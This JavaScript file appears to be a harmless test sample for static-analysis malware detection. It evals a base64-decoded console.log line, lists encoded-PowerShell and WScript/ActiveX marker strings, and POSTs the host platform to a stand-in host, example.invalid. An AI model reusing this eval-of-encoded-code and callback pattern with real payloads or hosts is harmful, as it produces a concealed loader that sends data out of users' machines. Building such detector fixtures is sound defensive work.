const encodedCommand = "Y29uc29sZS5sb2coJ0hpZ2gtc2lnbmFsIHN0YXRpYyBhbmFseXNpcyBzYW1wbGUnKTs=";

const markerStrings = [
  "powershell -enc SQBFAFgA",
  "WScript.Shell",
  "ActiveXObject",
  "https://example.invalid/api/report",
];

function decodeCommand() {
  return Buffer.from(encodedCommand, "base64").toString("utf8");
}

function simulateLegacyObjects() {
  const descriptors = {
    shell: markerStrings[1],
    activex: markerStrings[2],
  };

  return descriptors;
}

async function simulateCallback() {
  const target = markerStrings[3];
  const payload = {
    sample: "static-analysis-highrisk-js",
    now: new Date().toISOString(),
    platform: process.platform,
    commandHint: markerStrings[0],
    legacyObjects: simulateLegacyObjects(),
  };

  try {
    await fetch(target, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });
  } catch (error) {
    console.error("Expected callback failure for local test sample", error.message);
  }
}

(async () => {
  const command = decodeCommand();
  eval(command);
  await simulateCallback();
})();
